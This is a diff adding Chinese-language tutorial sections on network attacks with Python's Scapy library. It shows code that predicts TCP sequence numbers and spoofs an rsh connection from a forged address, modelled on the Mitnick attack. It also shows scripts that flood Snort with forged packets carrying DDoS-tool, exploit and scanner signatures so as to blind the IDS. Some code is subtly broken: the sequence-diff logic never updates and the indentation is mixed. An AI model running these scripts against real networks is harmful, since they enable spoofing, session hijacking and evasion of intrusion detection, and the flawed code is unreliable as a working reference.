@@ -361,3 +361,103 @@ src = "10.1.1.2"
 target = "192.168.1.3"
 syn_flood(src, target)
 ```
+### 计算 TCP 序列号
+
+Mitnick 能够伪造一个 TCP 连接到目标。不过，这取决于他能够发送伪造 SYN 包的能力，接着被攻击的机器会返回一个 TCP SYN-ACK 包确认连接。为了完成连接，Mitnick 需要在 SYN-ACK 中正确地猜出 TCP 的序列号（因为他无法观察到），然后把猜到的正确的 TCP 序列号放在 ACK 包中发送回去。
+
+在 Python 中重现这一过程，将发送一个 TCP SYN 包，然后等待 TCP SYN-ACK 包。收到之后，将从这个确认包中读出 TCP 序列号，并把它打印到屏幕上。编写的函数 `cal_tsn` 将接收目标 IP 地址这个参数，返回下一个 SYN-ACK 包的序列号（当前 SYN-ACK 包的序列号加上差值）
+
+```python
+from scapy.all import *
+def cal_tsn(target):
+    seq_num = 0
+    pre_num = 0
+    diff_seq = 0
+    for x in range(1, 5):
+        if pre_num != 0:
+            pre_num = seq_num
+        pkt = IP(dst=target) / TCP()
+        ans = sr1(pkt, verbose=0)
+        seq_num = ans.getlayer(TCP).seq
+        diff_seq = seq_num - pre_num
+        print("[+] TCP Seq Difference: {}".format(diff_seq))
+	return seq_num + diff_seq
+
+target = "192.168.1.106"
+seq_num = cal_tsn(target)
+print("[+] Next TCP Sequence Number to ACK is: {}".format(seq_num + 1))
+```
+
+### 伪造 TCP 连接
+
+在 Python 中重现这一行为，将创建和发送两个数据包。首先，创建一个 TCP 源端口为 513，目标端口为 514，源 IP 地址为被假冒的服务器，目标 IP 地址为被攻击计算机的 SYN 包。接着，创建一个相同的 ACK 包，并把计算得到的序列号填入相应的字段中，最后把它发送出去
+
+```python
+from scapy.all import *
+
+def spoof_conn(src, target, ack):
+    ip_layer = IP(src=src, dst=target)
+    tcp_layer = TCP(sport=513, dport=514)
+    syn_pkt = ip_layer / tcp_layer
+    send(syn_pkt)
+    ip_layer = IP(src=src, dst=target)
+    tcp_layer = TCP(sport=513, dport=514, ack=ack)
+    ack_pkt = ip_layer / tcp_layer
+    send(ack_pkt)
+
+src = "10.1.1.2"
+target = "192.168.1.106"
+seq_num = 2024371201
+spoof_conn(src, target, seq_num)
+```
+
+## 使用 Scapy 愚弄入侵检测系统
+
+入侵检测系统（Intrusion DetectionSystem，IDS），基于网络的入侵检测系统（network-based intrusion detection system，NIDS）可以通过记录流经 IP 网络的数据包实时地分析流量。用已知的恶意特征码对数据包进行扫描，IDS 可以在攻击成功之前就向网络分析师发出警报。SNORT 这个 IDS 系统自带的许多不同规则，就使它能够识别出许多包括不同类型的踩点，漏洞利用已经拒绝服务攻击在内的真实环境中的攻击手段。检查其中一些规则配置文件中的内容，可以看到针对 TFN、tfn2k 和 Trin00 分布式拒绝服务攻击工具包的四个警报触发规则。
+
+```shell
+cat /etc/snort/rules/ddos.rules
+```
+
+第一条警报触发规则——DDoS TFN 探针（DDoS TFN Probe）
+
+```python
+from scapy.all import *
+def ddos_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst) / ICMP(type=8,id=678) / Raw(load="1234")
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst) / ICMP(type=0) / Raw(load="AAAAAAAAA")
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst) / UDP(dport=31335) / Raw(load="PONG")
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst) / ICMP(type=0, id=456)
+    send(pkt, iface=iface, count=count)
+    
+src = "1.3.3.7"
+dst = "192.168.1.106"
+iface = "eth0"
+count = 1
+ddos_test(src, dst, iface, count)
+```
+
+接着看 SNORT 的 `exploit.rules` 签名文件中更复杂的警报触发规则：
+
+```python
+def exploit_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00...")
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02...")
+    send(pkt, iface=iface, count=count)
+```
+
+ 最后，伪造一些踩点或扫描操作也挺不错的。查看 SNORT 中关于扫描的警报触发规则，找到两个可以生成对应数据包的警报触发规则。这两个规则检测的是：发往 UDP 协议上的某些特定端口的数据包的内容中有无特定的特征码，如果有，则触发警报。
+
+以下生成了两个会触发 cybercop 扫描器和 Amanda 扫描器扫描报警的数据包：
+
+```python
+def scan_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst) / UDP(dport=7) / Raw(load="cybercop")
+    send(pkt)
+    pkt = IP(src=src, dst=dst) / UDP(dport=10080) / Raw(load="Amanda")
+    send(pkt, iface=iface, count=count)
+```
